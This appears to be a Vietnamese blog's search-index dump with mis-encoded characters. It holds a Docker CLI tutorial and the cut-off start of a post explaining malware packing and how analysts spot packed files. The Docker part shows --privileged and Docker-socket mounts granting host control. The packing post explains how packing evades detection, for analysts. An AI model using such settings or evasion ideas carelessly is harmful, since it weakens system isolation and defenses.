ubuntu-16-apache-php-7.1 7 [OK] 1and1internet/ubuntu-16-nginx-php-7.0 ubuntu-16-nginx-php-7.0 4 [OK] pivotaldata/ubuntu A quick freshening-up of the base Ubuntu docâ€¦ 4 pivotaldata/ubuntu16.04-build Ubuntu 16.04 image for GPDB compilation 2 pivotaldata/ubuntu-gpdb-dev Ubuntu images for GPDB development 1 smartentry/ubuntu ubuntu with smartentry 1 [OK] 1and1internet/ubuntu-16-sshd ubuntu-16-sshd 1 [OK] 1and1internet/ubuntu-16-php-7.1 ubuntu-16-php-7.1 1 [OK] Má»¥c OFFICIAL cho biáº¿t phiÃªn báº£n nÃ y lÃ  chÃ­nh chá»§. Äá»ƒ sá»­ dá»¥ng má»™t image nÃ o Ä‘Ã³, chÃºng ta cáº§n Ä‘á»c thÃ´ng tin cá»§a image trÃªn hub.docker vÃ  cÃ¡c phiá»ƒn báº£n cá»§a image náº±m á»Ÿ pháº§n tag.\nTáº£i image Äá»ƒ táº£i image, ta sá»­ dá»¥ng:\n1 docker pull image:tag á» Ä‘Ã¢y, tag lÃ  phiÃªn báº£n mÃ  chÃºng ta muá»‘n sá»­ dá»¥ng. Náº¿u chÃºng ta muá»‘n táº£i báº£n ubuntu 20.04 thÃ¬ cÃ¢u lá»‡nh sáº½ lÃ :\n1 2 3 4 â¯ docker pull ubuntu:20.04 20.04: Pulling from library/ubuntu Digest: sha256:adf73ca014822ad8237623d388cedf4d5346aa72c270c5acc01431cc93e18e2d Status: Downloaded newer image for ubuntu:20.04 ChÃºng ta kiá»ƒm tra láº¡i Ä‘á»ƒ xÃ¡c nháº­n docker Ä‘Ã£ Ä‘Æ°á»£c táº£i báº±ng lá»‡nh docker images\n1 2 3 4 5 6 7 â¯ docker images REPOSITORY TAG IMAGE ID CREATED SIZE debian latest 4a7a1f401734 3 weeks ago 114MB ubuntu 20.04 7e0aa2d69a15 6 weeks ago 72.7MB ubuntu latest 7e0aa2d69a15 6 weeks ago 72.7MB docker/getting-started latest 3ba8f2ff0727 2 months ago 27.9MB hello-world latest d1165f221234 3 months ago 13.3kB Khi chÃºng ta khÃ´ng Ä‘á»ƒ tag, máº·c Ä‘á»‹nh nÃ³ xem nhÆ° tag nÃ y lÃ  latest vÃ  sáº½ táº£i báº£n má»›i nháº¥t vá», vÃ  khi chÃºng ta in ra cÃ¡c images, nhá»¯ng images nÃ y sáº½ cÃ³ tag lÃ  latest.\n1 2 3 4 5 6 â¯ docker pull centos Using default tag: latest latest: Pulling from library/centos 7a0437f04f83: Pull complete Digest: sha256:5528e8b1b1719d34604c87e11dcd1c0a20bedf46e83b5632cdeac91b8c04efc1 Status: Downloaded newer image for centos:latest XÃ³a Image Äá»ƒ xÃ³a má»™t image khÃ´ng sá»­ dá»¥ng, chÃºng ta dÃ¹ng cÃ¢u lá»‡nh:\n1 docker image rm \u0026lt;ten_image_muon_xoa:tag\u0026gt; VÃ­ dá»¥, tÃ´i muá»‘n xÃ³a image ubuntu:20.04, ta lÃ m nhÆ° sau:\n1 2 â¯ docker image rm ubuntu:20.04 Untagged: ubuntu:20.04 Káº¿t quáº£ sau khi xÃ³a:\n1 2 3 4 5 6 â¯ docker images REPOSITORY TAG IMAGE ID CREATED SIZE debian latest 4a7a1f401734 3 weeks ago 114MB ubuntu latest 7e0aa2d69a15 6 weeks ago 72.7MB docker/getting-started latest 3ba8f2ff0727 2 months ago 27.9MB hello-world latest d1165f221234 3 months ago 13.3kB NgoÃ i ra, chÃºng ta cÃ²n cÃ³ thá»ƒ xÃ³a báº±ng cÃ¡ch dÃ¹ng IMAGE ID, vÃ­ dá»¥, ta muá»‘n xÃ³a image hello-world,\n1 2 3 4 5 6 7 8 9 10 â¯ docker image rm d1165f221234 Untagged: hello-world:latest Untagged: hello-world@sha256:5122f6204b6a3596e048758cabba3c46b1c937a46b5be6225b835d091b90e46c Deleted: sha256:d1165f2212346b2bab48cb01c1e39ee8ad1be46b87873d9ca7a4e434980a7726 Deleted: sha256:f22b99068db93900abe17f7f5e09ec775c2826ecfe9db961fea68293744144bd â¯ docker images REPOSITORY TAG IMAGE ID CREATED SIZE debian latest 4a7a1f401734 3 weeks ago 114MB ubuntu latest 7e0aa2d69a15 6 weeks ago 72.7MB docker/getting-started latest 3ba8f2ff0727 2 months ago 27.9MB Docker version Usage 1 $ docker version [OPTIONS] Get the server version 1 $ docker version --format \u0026#39;{{.Server.Version}}\u0026#39; Dump raw JSON data 1 $ docker version --format \u0026#39;{{json .}}\u0026#39; Print the current context 1 $ docker version --format=\u0026#39;{{.Client.Context}}\u0026#39; Docker run Image sáº½ Ä‘Æ°Æ¡c cháº¡y trong cÃ¡c container, Ä‘á»ƒ cháº¡y ta thá»±c hiá»‡n cÃ¢u lá»‡nh:\nUsage: 1 $ docker run [OPTIONS] IMAGE [COMMAND] [ARG...] CÃ³ ráº¥t nhiá»u tham sá»‘, cÃ¡c báº¡n cÃ³ thá»ƒ Ä‘á»c á»Ÿ Ä‘Ã¢y VÃ­ dá»¥: Cháº¡y má»™t image 1 docker run -it \u0026lt;ten_image/image_id\u0026gt; á» Ä‘Ã¢y, -it lÃ  viáº¿t gá»n cá»§a 2 options: -i (interactive) vÃ  -t (terminal) chá»‰ Ä‘á»‹nh táº¡o ra container vÃ  cÃ³ thá»ƒ tÆ°Æ¡ng tÃ¡c vá»›i nÃ³ trá»±c tiáº¿p trÃªn terminal. Giáº£ sá»­ ta cháº¡y image ubuntu:latest.\n1 2 â¯ docker run -it ubuntu:latest root@b2d8e983bcef:/# Váº­y lÃ  chÃºng ta Ä‘Ã£ cháº¡y image ubuntu:latest vÃ  Ä‘ang á»Ÿ container ubuntu, tÃ i khoáº£n root vá»›i hostname lÃ  b2d8e983bcef. ChÃºng ta kiá»ƒm tra thÃ´ng tin cá»§a ubuntu nÃ y.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 root@ff7140c65b73:/# cat /etc/*release DISTRIB_ID=Ubuntu DISTRIB_RELEASE=20.04 DISTRIB_CODENAME=focal DISTRIB_DESCRIPTION=\u0026#34;Ubuntu 20.04.2 LTS\u0026#34; NAME=\u0026#34;Ubuntu\u0026#34; VERSION=\u0026#34;20.04.2 LTS (Focal Fossa)\u0026#34; ID=ubuntu ID_LIKE=debian PRETTY_NAME=\u0026#34;Ubuntu 20.04.2 LTS\u0026#34; VERSION_ID=\u0026#34;20.04\u0026#34; HOME_URL=\u0026#34;https://www.ubuntu.com/\u0026#34; SUPPORT_URL=\u0026#34;https://help.ubuntu.com/\u0026#34; BUG_REPORT_URL=\u0026#34;https://bugs.launchpad.net/ubuntu/\u0026#34; PRIVACY_POLICY_URL=\u0026#34;https://www.ubuntu.com/legal/terms-and-policies/privacy-policy\u0026#34; VERSION_CODENAME=focal UBUNTU_CODENAME=focal root@ff7140c65b73:/# Äá»ƒ kiá»ƒm tra cÃ³ nhá»¯ng container nÃ o Ä‘ang cháº¡y trÃªn mÃ¡y, chÃºng ta dÃ¹ng lá»‡nh:\n1 2 3 â¯ docker ps CONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES ff7140c65b73 ubuntu:latest \u0026#34;/bin/bash\u0026#34; 2 minutes ago Up 2 minutes unruffled_goldberg Káº¿t quáº£ trÃªn cho tháº¥y, há»‡ thá»‘ng Ä‘ang cháº¡y má»™t container cÃ³ id lÃ  ff7140c65b73 vÃ  cháº¡y tá»« image ubuntu:latest, vá»›i command /bin/bash.\nKhi chÃºng ta gÃµ lá»‡nh exit Ä‘á»ƒ thoÃ¡t khá»i container, lá»‡nh docker ps sáº½ khÃ´ng hiá»ƒn thá»‹ container nÃ o, tuy nhiÃªn, lá»‡nh docker ps -a sáº½ liá»‡t kÃª táº¥t cáº£ cÃ¡c container Ä‘ang hiá»‡n cÃ³ trÃªn mÃ¡y kÃ¨m theo tráº¡ng thÃ¡i cá»§a nÃ³.\n1 2 3 4 â¯ docker ps -a CONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES ff7140c65b73 ubuntu:latest \u0026#34;/bin/bash\u0026#34; 9 minutes ago Exited (0) 5 seconds ago unruffled_goldberg b2d8e983bcef ubuntu:latest \u0026#34;/bin/bash\u0026#34; 11 minutes ago Exited (0) 11 minutes ago gallant_snyder Tráº¡ng thÃ¡i Exited thá»ƒ hiá»‡n container Ä‘Ã£ bá»‹ dá»«ng, vÃ  Ä‘á»ƒ khá»Ÿi Ä‘á»™ng láº¡i docker Ä‘Ã£ dá»«ng, ta dÃ¹ng lá»‡nh docker start\n1 2 3 4 5 6 7 8 9 â¯ docker start ff7140c65b73 ff7140c65b73 â¯ docker ps CONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES ff7140c65b73 ubuntu:latest \u0026#34;/bin/bash\u0026#34; 12 minutes ago Up 6 seconds unruffled_goldberg â¯ docker ps -a CONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES ff7140c65b73 ubuntu:latest \u0026#34;/bin/bash\u0026#34; 12 minutes ago Up 11 seconds unruffled_goldberg b2d8e983bcef ubuntu:latest \u0026#34;/bin/bash\u0026#34; 14 minutes ago Exited (0) 14 minutes ago gallant_snyder Äá»ƒ vÃ o láº¡i há»‡ Ä‘iá»u hÃ nh trong container, ta dÃ¹ng lá»‡nh docker attach container_id, lÆ°u Ã½, id chÃºng ta khÃ´ng cáº§n ghi háº¿t, chá»‰ cáº§n ghi 2-3 chá»¯ cÃ¡i Ä‘áº§u lÃ  Ä‘Æ°á»£c.\n1 2 â¯ docker attach ff root@ff7140c65b73:/# Äá»ƒ thoÃ¡t khá»i container mÃ  khÃ´ng dá»«ng nÃ³, ta dÃ¹ng tá»• há»£p phÃ­m ctrl + P, ctrl + Q. Khi chÃºng ta dÃ¹ng tá»• há»£p nÃ y, ta sáº½ cÃ³ káº¿t quáº£ sau:\n1 2 â¯ docker attach ff root@ff7140c65b73:/# read escape sequence Tá»« mÃ¡y host, Ä‘á»ƒ dá»«ng container, ta dÃ¹ng lá»‡nh docker stop \u0026lt;container_name/container_id\u0026gt;\n1 2 3 4 5 6 7 â¯ docker ps CONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES ff7140c65b73 ubuntu:latest \u0026#34;/bin/bash\u0026#34; 26 minutes ago Up 14 minutes unruffled_goldberg â¯ docker stop unruffled_goldberg unruffled_goldberg â¯ docker ps CONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES Äáº·t tÃªn cho container 1 2 â¯ docker run -it --name \u0026#34;centos_docker\u0026#34; -h centos1 centos:latest [root@centos1 /]# VÃ­ dá»¥ trÃªn cháº¡y container cÃ³ tÃªn lÃ  centos_docker sá»­ dá»¥ng image centos:latest.\n-it táº¡o má»™t tÆ°Æ¡ng tÃ¡c bash shell trong container. --name: Ä‘áº·t tÃªn cho container. -h: Ä‘áº·t hostname cho container.\nChÃºng ta cÃ³ thá»ƒ kiá»ƒm tra 1 2 3 â¯ docker ps CONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES ddf68933af54 centos:latest \u0026#34;/bin/bash\u0026#34; 2 minutes ago Up 3 seconds centos_docker Capture container ID (\u0026ndash;cidfile) 1 2 3 4 5 6 7 8 9 â¯ docker run --cidfile /tmp/docker_test.cid ubuntu echo \u0026#34;test\u0026#34; Unable to find image \u0026#39;ubuntu:latest\u0026#39; locally latest: Pulling from library/ubuntu 345e3491a907: Pull complete 57671312ef6f: Pull complete 5e9250ddb7d0: Pull complete Digest: sha256:adf73ca014822ad8237623d388cedf4d5346aa72c270c5acc01431cc93e18e2d Status: Downloaded newer image for ubuntu:latest test Lá»‡nh nÃ y táº¡o container vÃ  in test ra mÃ n hÃ¬nh console. Flag cidfile yÃªu cáº§u Docker táº¡o má»™t file má»›i vÃ \nviáº¿t container ID vÃ o nÃ³. Náº¿u file Ä‘Ã£ tá»“n táº¡i, Docker sáº½ tráº£ vá» error. Docker sáº½ Ä‘Ã³ng file khi docker run káº¿t thÃºc. Full container capabilities (\u0026ndash;privileged) 1 2 3 4 â¯ docker run -t -i --rm ubuntu bash root@bd1340e91d1e:/# mount -t tmpfs none /mnt mount: /mnt: permission denied. root@bd1340e91d1e:/# --rm tá»± Ä‘á»™ng xÃ³a container náº¿u nhÆ° nÃ³ Ä‘Ã£ tá»“n táº¡i. Lá»‡nh nÃ y khÃ´ng hoáº¡t Ä‘á»™ng, vÃ¬ theo máº·c Ä‘á»‹nh, nhá»¯ng cÃ¢u lá»‡nh Ä‘em láº¡i kháº£ nÄƒng nguy hiá»ƒm tá»›i kernel sáº½ bá»‹ loáº¡i bá», bao gá»“m cap_sys_admin (lá»‡nh yÃªu cáº§u mount filesystems). Tuy nhiÃªn, flag --privileged sáº½ cho phÃ©p chÃºng ta run: 1 2 3 4 5 6 7 8 9 10 11 â¯ docker run -t -i --privileged ubuntu bash root@a3c5921afbbc:/# mount -t tmpfs none /mnt root@a3c5921afbbc:/# df -h Filesystem Size Used Avail Use% Mounted on overlay 110G 58G 46G 56% / tmpfs 64M 0 64M 0% /dev tmpfs 3.9G 0 3.9G 0% /sys/fs/cgroup /dev/sda2 110G 58G 46G 56% /etc/hosts shm 64M 0 64M 0% /dev/shm none 3.9G 0 3.9G 0% /mnt root@a3c5921afbbc:/# flag --privileged sáº½ cáº¥p háº¿t táº¥t cáº£ capabilities cho container, vÃ  loáº¡i bá» má»i giá»›i háº¡n Ä‘Æ°á»£c Ä‘áº·t ra bá»Ÿi cgroup controller. NÃ³i cÃ¡ch khÃ¡c, container cÃ³ thá»ƒ cháº¡y háº§u háº¿t má»i thá»© mÃ  mÃ¡y host cÃ³ thá»ƒ lÃ m. Set working directory (-w) 1 $ docker run -w /path/to/dir/ -i -t ubuntu pwd -w cho phÃ©p cÃ¢u lá»‡nh thá»±c thi bÃªn trong thÆ° má»¥c Ä‘Ã£ chá»‰ Ä‘á»‹nh. Náº¿u Ä‘Æ°á»ng dáº«n tá»›i thÆ° má»¥c khÃ´ng tá»“n táº¡i,\nnÃ³ sáº½ táº¡o má»™t thÆ° má»¥c má»›i trong container tÆ°Æ¡ng á»©ng Ä‘Æ°á»ng dáº«n Ä‘Ã³. Set storage driver options per container 1 $ docker run -it --storage-opt size=120G fedora /bin/bash size cho phÃ©p chÃºng ta thiáº¿t láº­p container rootfs size tá»›i 120G táº¡i thá»i Ä‘iá»ƒm táº¡o.\nOption nÃ y chá»‰ hiá»‡u quáº£ cho devicemapper, btrfs, overlay2, windowsfilter vÃ  zfs graph drives\nVá»›i devicemapper, btrfs, windowsfilter and zfs graph drivers user khÃ´ng thá»ƒ gÃ¡n kÃ­ch thÆ°á»›c\nnhá» hÆ¡n Default BasFS Size\nVá»›i overlay2 storage drive, size option chá»‰ hoáº¡t Ä‘á»™ng náº¿u trÃ¬nh fs Ä‘Æ°á»£c gÃ¡n lÃ  xfs\nvÃ  mounted vá»›i option pquota. trÆ°á»ng há»£p nÃ y, ngÆ°á»i dÃ¹ng cÃ³ thá»ƒ cáº¥p size.\nMount tmpfs (\u0026ndash;tmpfs) 1 $ docker run -d --tmpfs /run:rw,noexec,nosuid,size=65536k my_image flag --tmpfs mount má»™t empty tmpfs vÃ o container vá»›i rw, noexec, nosuid, size=65536k\nMount volume (-v, \u0026ndash;read-only) 1 $ docker run -v `pwd`:`pwd` -w `pwd` -i -t ubuntu pwd -v mount thÆ° má»¥c hiá»‡n táº¡i vÃ o container -w cho phÃ©p command Ä‘Æ°á»£c thá»±c thi bÃªn trong thÆ° má»¥c hiá»‡n táº¡i báº±ng cÃ¡ch thay Ä‘á»•i trong thÆ° má»¥c\nthÃ nh giÃ¡ trá»‹ Ä‘Æ°á»£c tráº£ vá» bá»Ÿi pwd. NÃ³ sáº½ thá»±c thi káº¿t há»£p cÃ¢u lá»‡nh sá»­ dá»¥ng container,\nnhÆ°ng bÃªn trong thÆ° má»¥c hiá»‡n táº¡i: 1 $ docker run -v /doesnt/exist:/foo -w /foo -i -t ubuntu bash Khi host directory cá»§a bind-mounted volume khÃ´ng tá»“n táº¡i, Docker sáº½ tá»± Ä‘á»™ng táº¡o thÆ° má»¥c nÃ y trÃªn host cho báº¡n.\nTrong vÃ­ dá»¥ trÃªn, Docker sáº½ táº¡o thÆ° má»¥c /doesnt/exist trÆ°á»›c khi cháº¡y container.\n1 $ docker run --read-only -v /icanwrite busybox touch /icanwrite/here --read-only Ä‘á»ƒ kiá»ƒm soÃ¡t nÆ¡i container viáº¿t file, --read-only flag mount container\u0026rsquo;s root filesystem chá»‰ Ä‘á»ƒ Ä‘á»c. 1 $ docker run -t -i -v /var/run/docker.sock:/var/run/docker.sock -v /path/to/static-docker-binary:/usr/bin/docker busybox sh Báº±ng cÃ¡ch liÃªn káº¿t docker unix socket vá»›i docker binary liÃªn káº¿t tÄ©nh, chÃºng ta cáº¥p container toÃ n quyá»n truy cáº­p\nvÃ  chá»‰nh sá»­a host\u0026rsquo;s Docker daemon.\nAdd bind mounts or volumes using the \u0026ndash;mount flag VÃ­ dá»¥: 1 $ docker run --read-only --mount type=volume,target=/icanwrite busybox touch /icanwrite/here 1 $ docker run -t -i --mount type=bind,src=/data,dst=/data busybox sh Publish or expose port (-p, \u0026ndash;expose) 1 $ docker run -p 127.0.0.1:80:8080/tcp ubuntu bash CÃ¢u lá»‡nh káº¿t ná»‘i cá»•ng 8080 cá»§a container tá»›i cá»“ng 80 TCP trÃªn 127.0.0.1 cá»§a host machine.\nChÃºng ta cÃ³ thá»ƒ chá»‰ Ä‘á»‹nh udp vÃ  sctp ports.\nCÃ³ má»™t lÆ°u Ã½, nhá»¯ng port khÃ´ng rÃ ng buá»™c bá»Ÿi host sáº½ cÃ³ thá»ƒ Ä‘Æ°á»£c truy cáº­p tá»« bÃªn ngoÃ i.\nÄiá»u nÃ y cÅ©ng Ã¡p dá»¥ng náº¿u chÃºng ta muá»‘n cáº¥u hÃ¬nh UFW Ä‘á»ƒ cháº·n cÃ´ng cá»¥ nÃ y, vÃ¬ Docker quáº£n lÃ½ cÃ¡c quy tÃ¡c iptables\ncá»§a riÃªng mÃ¬nh.\n1 $ docker run --expose 80 ubuntu bash Hiá»ƒn thá»‹ cá»•ng 80 cá»§a container mÃ  khÃ´ng cÃ³ xuáº¥t hiá»‡n port trÃªn host system.\nSet environment variables (-e, \u0026ndash;env, \u0026ndash;env-file) 1 docker run -e MYVAR1 --env MYVAR2=foo --env-file ./env.list ubuntu bash Sá»­ dá»¥ng nhá»¯ng flag -e, --env, --env-file Ä‘á»ƒ thiáº¿t láº­p nhá»¯ng biáº¿n mÃ´i trÆ°á»ng (khÃ´ng pháº£i dáº¡ng array)\ncho container báº¡n Ä‘ang cháº¡y, hoáº·c ghi Ä‘Ã¨ nhá»¯ng file Ä‘Ã³ cÃ³ sáºµn. vÃ­ dá»¥:\n1 2 3 â¯ docker run --env VAR1=value1 --env VAR2=value2 ubuntu env | grep VAR VAR2=value2 VAR1=value1 Connect a container to a network (\u0026ndash;network) 1 $ docker run -itd --network=my-net busybox ChÃºng ta cÃ³ thá»ƒ chá»n Ä‘á»‹a chá»‰ IP cho container vá»›i flag --ip hoáº·c --ip6 khi báº¡n cháº¡y container\ntrÃªn user-defined network\n1 $ docker run -itd --network=my-net --ip=10.10.9.75 busybox Docker rm Äá»ƒ xÃ³a container khi nÃ³ Ä‘ang dá»«ng, ta dÃ¹ng lá»‡nh docker rm container_id\n1 2 3 4 5 6 7 8 9 10 11 â¯ docker ps -a CONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES ddf68933af54 centos:latest \u0026#34;/bin/bash\u0026#34; 9 minutes ago Exited (0) 7 minutes ago centos_docker ff7140c65b73 ubuntu:latest \u0026#34;/bin/bash\u0026#34; About an hour ago Exited (0) 45 minutes ago unruffled_goldberg b2d8e983bcef ubuntu:latest \u0026#34;/bin/bash\u0026#34; About an hour ago Exited (0) About an hour ago gallant_snyder â¯ docker rm b2 b2 â¯ docker ps -a CONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES ddf68933af54 centos:latest \u0026#34;/bin/bash\u0026#34; 10 minutes ago Exited (0) 7 minutes ago centos_docker ff7140c65b73 ubuntu:latest \u0026#34;/bin/bash\u0026#34; About an hour ago Exited (0) 45 minutes ago unruffled_goldberg TrÆ°á»ng há»£p container Ä‘ang cháº¡y mÃ  ta muá»‘n xÃ³a thÃ¬ ta thÃªm options -f\n1 docker rm -f container_id/container_name Tá»•ng káº¿t Trong bÃ i há»c nÃ y, chÃºng ta Ä‘Ã£ há»c Ä‘Æ°á»£c tá»« anh XuanThuLabChanel nhá»¯ng kiáº¿n thá»©c nhÆ° sau:\ndocker images: Liá»‡t kÃª danh sÃ¡ch táº¥t cáº£ cÃ¡c images trÃªn docker docker pull image:tag táº£i image vá» mÃ¡y docker image rm image_name/image_id xÃ³a image docker version: xem version cá»§a docker docker run -it --name \u0026quot;ten_container\u0026quot; -h \u0026quot;host_name\u0026quot; image: táº¡o container. ctrl + P, ctrl + Q: thoÃ¡t khá»i container nhÆ°ng váº«n Ä‘á»ƒ container cháº¡y. docker ps: in ra container cháº¡y docker stop container_id/name: buá»™c container Ä‘ang cháº¡y dá»«ng khi ta Ä‘ang á»Ÿ host. docker attach container_id/name: trá»Ÿ láº¡i container Ä‘ang cháº¡y. docker rm containerid/name: xÃ³a container Ä‘Ã£ dá»«ng. docker rm -f containerid/name: xÃ³a container Ä‘ang cháº¡y.\nKáº¿t thÃºc bÃ i viáº¿t nÃ y, má»™t láº§n ná»¯a em xin chÃ¢n thÃ nh gá»­i lá»i cáº£m Æ¡n Ä‘áº¿n anh XuanThuLabChanel Ä‘Ã£ lÃ m nhá»¯ng bÃ i há»c quÃ½ giÃ¡ vÃ  bá»• Ã­ch nÃ y. ","description":"BÃ i nÃ y chÃºng ta sáº½ há»c lÃ m quen vá»›i docker command line, má»™t sá»‘ cÃ¢u lá»‡nh thÃ´ng dá»¥ng nhÆ° docker images, docker version, docker run, docker rm","id":23,"section":"posts","tags":["Docker"],"title":"TÃ¬m hiá»ƒu vÃ  sá»­ dá»¥ng docker (P1)","uri":"https://minhlongmt183.github.io/posts/docker_p1/"},{"content":"Nguá»“n tham kháº£o\nWhat is Packing? Packing cÃ³ nghÄ©a lÃ  nÃ©n (compressed), hoáº·c xÃ¡o trá»™n (obfuscated) file thá»±c thi Ä‘á»ƒ lÃ m cho file thá»±c thi khÃ³ phÃ¡t hiá»‡n, khÃ³ phÃ¢n tÃ­ch tÄ©nh, khÃ³ dá»‹ch ngÆ°á»£c. Trong ngá»¯ cáº£nh cá»§a malware, vÃ¬ mÃ£ Ä‘á»™c chá»§ yáº¿u Ä‘Æ°á»£c compressed, obfuscated trong cÃ¡c máº«u Ä‘Ã³ng gÃ³i, cÃ¡c cÃ´ng cá»¥ dÃ¹ng Ä‘á»ƒ phÃ¢n tÃ­ch tÄ©nh sáº½ gáº·p váº¥n Ä‘á» khi xÃ¡c Ä‘á»‹nh liá»‡u tá»‡p nhá»‹ phÃ¢n nÃ y cÃ³ pháº£i lÃ  mÃ£ Ä‘á»™c hay khÃ´ng. BÃªn cáº¡nh nÃ³, má»™t thuáº­t toÃ¡n packing tá»‘t sáº½ lÃ m khÃ³ khÄƒn qÃºa trÃ¬nh phÃ¢n tÃ­ch cá»§a cÃ¡c nhÃ  phÃ¢n tÃ­ch mÃ£ Ä‘á»™c, tá»« Ä‘Ã³ giÃºp cho vÃ²ng Ä‘á»i cá»§a mÃ£ Ä‘á»™c Ä‘Æ°á»£c kÃ©o dÃ i lÃ¢u hÆ¡n.\nMá»™t cÃ¡ch nÃ´m na, chÃºng ta cÃ³ thá»ƒ hiá»ƒu packer gá»“m: compressing packers vÃ  encrypting packers. Trong Ä‘Ã³ compressing packers má»¥c Ä‘Ã­ch lÃ  Ä‘Æ°a file thá»±c thi vá» dáº¡ng nÃ©n, lÃ m giáº£m kÃ­ch thÆ°á»›c cá»§a file, cÃ²n encrypting packers cÃ³ má»¥c Ä‘Ã­ch mÃ£ hÃ³a hoáº·c xÃ¡o trá»™n file Ä‘Ã£ Ä‘Æ°á»£c nÃ©n, nháº±m ngÄƒn cháº·n ngÆ°á»i dÃ¹ng dá»‹ch ngÆ°á»£c. NhÆ° Ä‘Ã£ nÃ³i, cÃ¡ch hiá»ƒu trÃªn chá»‰ lÃ  hiá»ƒu má»™t cÃ¡ch nÃ´m na, bá»Ÿi vÃ¬ cÃ³ nhiá»u packer káº¿t há»£p cáº£ hai tÃ­nh cháº¥t trÃªn, cÃ²n cÃ³ nhÆ°ng packer (nhÆ° UPX), nÃ³ chá»‰ compressing mÃ  khÃ´ng cÃ³ encrypting.\nHow does packing work? ChÃºng ta sáº½ nÃ³i vá» kiáº¿n trÃºc \u0026ldquo;stub-payload\u0026rdquo;, má»™t trong nhá»¯ng cÆ¡ cháº¿ Ä‘Æ°á»£c sá»­ dá»¥ng nhiá»u bá»Ÿi packer, ká»ƒ cáº£ UPX.\nTrong kiáº¿n trÃºc \u0026ldquo;stub-payload\u0026rdquo;, má»™t file thá»±c thi sáº½ gá»“n hai thÃ nh pháº§n chÃ­nh: ná»™i dung Ä‘Ã£ Ä‘Æ°á»£c nÃ©n / mÃ£ hÃ³a tá»« file gá»‘c vÃ  má»™t Ä‘oáº¡n mÃ£ dÃ¹ng Ä‘á»ƒ giáº£i nÃ©n / giáº£i mÃ£ file nÃ y vá» file gá»‘c vÃ  thá»±c thi nÃ³. Äoáº¡n mÃ£ nÃ y Ä‘Æ°á»£c gá»i lÃ  stub. Vá» báº£n cháº¥t, file ban Ä‘áº§u Ä‘Æ°á»£c náº¿n / mÃ£ hÃ³a, sau Ä‘Ã³ Ä‘Æ°á»£c bá»c trong tá»‡p thá»±c thi má»›i cÃ³ chá»©a mÃ£ Ä‘á»ƒ Ä‘Æ°a nÃ³ vá» tráº¡ng thÃ¡i ban Ä‘áº§u\nIndication of Packing Lacking of Import in Import Address Table (IAT) Äá»ƒ má»™t file thá»±c thi cÃ³ thá»ƒ tÆ°Æ¡ng tÃ¡c vá»›i há»‡ Ä‘iá»u hÃ nh thÃ¬ file thá»±c thi cáº§n pháº£i cÃ³ cÃ¡c hÃ m Ä‘Æ°á»£c tÃ­ch há»£p vÃ o thÆ° viá»‡n há»‡ thá»‘ng nhÆ° kernel32.dll vÃ  user32.dll. Khi phÃ¢n tÃ­ch má»™t tá»‡p tin Ä‘Ã£ Ä‘Æ°á»£c giáº£i nÃ©n hoÃ n toÃ n, ta sáº½ tháº¥y má»™t sá»‘ lÆ°á»£ng lá»›n cÃ¡c import vÃ¬ mÃ£ Ä‘á»™c rÃµ rÃ ng muá»‘n tÆ°Æ¡ng tÃ¡c khÃ¡ nhiá»u vá»›i há»‡ Ä‘iá»u hÃ nh. Tuy nhiÃªn, má»™t stub cá»§a má»™t chÆ°Æ¡ng trÃ¬nh bá»‹ packed khÃ´ng cÃ³ nhiá»u chá»©c nÄƒng ngoÃ i viá»‡c giáº£i nÃ©n vÃ  thá»±c thi file gá»‘c, do Ä‘Ã³, nÃ³ sáº½ cÃ³ sá»‘ lÆ°á»£ng import Ã­t hÆ¡n ráº¥t nhiá»u so vá»›i file chuáº©n.\nNon-standard Section Names: Trong nhá»¯ng file thá»±c thi bÃ¬nh thÆ°á»ng, chÃºng thÆ°á»ng cÃ³ cÃ¡c sections giá»‘ng nhau má»i lÃºc (.text, .data, .rsrc,..). Tuy nhiÃªn, nhá»¯ng paker sáº½ tá»± Ä‘á»‹nh nghÄ©a section cho riÃªng nÃ³, Ä‘iá»u nÃ y cÅ©ng cho tháº¥y nhá»¯ng file cÃ³ section nhÆ° váº­y sáº½ khÃ´ng pháº£i lÃ  tiÃªu chuáº©n vÃ  cÃ³ thá»ƒ Ä‘Æ°á»£c Ä‘Ã³ng gÃ³i. VÃ­ dá»¥ nhÆ° UPX packer sáº½ thá»±c thi vá»›i cÃ¡c file cÃ³ tÃªn section lÃ  UPX0 vÃ  UPX1.\nSections with a small raw size but a large virtual size Khi chÃºng ta gáº·p má»™t file mÃ  cÃ³ raw size ráº¥t nhá» (Ä‘Ã´i khi báº±ng 0), Ä‘iá»u nÃ y muá»‘n nÃ³i file thá»±c thi khÃ´ng cÃ³ báº¥t kÃ¬ dá»¯ liá»‡u nÃ o trong section. Tuy nhiÃªn, khi file thá»±c thi Ä‘Æ°á»£c load vÃ o bá»™ nhá»›, raw size khÃ´ng cÃ²n liÃªn quan, vÃ  nÃ³ Ä‘Æ°á»£c thay bá»Ÿi virtual size cá»§a tá»«ng pháº§n cá»¥ thá»ƒ Ä‘Æ°á»£c cáº¥p phÃ¡t trong memory. Náº¿u má»™t file cÃ³ section Ä‘Æ°á»£c cáº¥p phÃ¡t vá»›i virtual space lá»›n vÃ  raw data ráº¥t nhá», nÃ³ cÃ³ kháº£ nÄƒng cao lÃ  nhá»¯ng Ä‘oáº¡n code dÃ¹ng Ä‘á»ƒ unpacked.\nSections with very high entropy: Tá»« entroy Ä‘á» cáº­p Ä‘áº¿n phÆ°Æ¡ng sai vÃ  tÃ­nh ngáº«u nhiÃªn cá»§a má»™t pháº§n dá»¯ liá»‡u. Nhá»¯ng thá»© nhÆ° ngÃ´n ngá»¯ Tiáº¿ng Anh, assembly code, cÃ¡c cáº¥u trÃºc giao tiáº¿p Ä‘Æ°á»£c xÃ¡c Ä‘á»‹nh rÃµ rÃ ng khÃ¡c thÆ°á»ng cÃ³ entropy tháº¥p vÃ¬ ngÃ´n ngá»¯ cÃ³ xu hÆ°á»›ng tuáº§n theo cÃ¡c máº«u cÃ³ thá»ƒ Ä‘oÃ¡n trÆ°á»›c Ä‘Æ°á»£c. Tuy nhiÃªn, encrypted data vÃ  compressed data khÃ´ng cÃ³ kháº£ nÄƒng dá»± 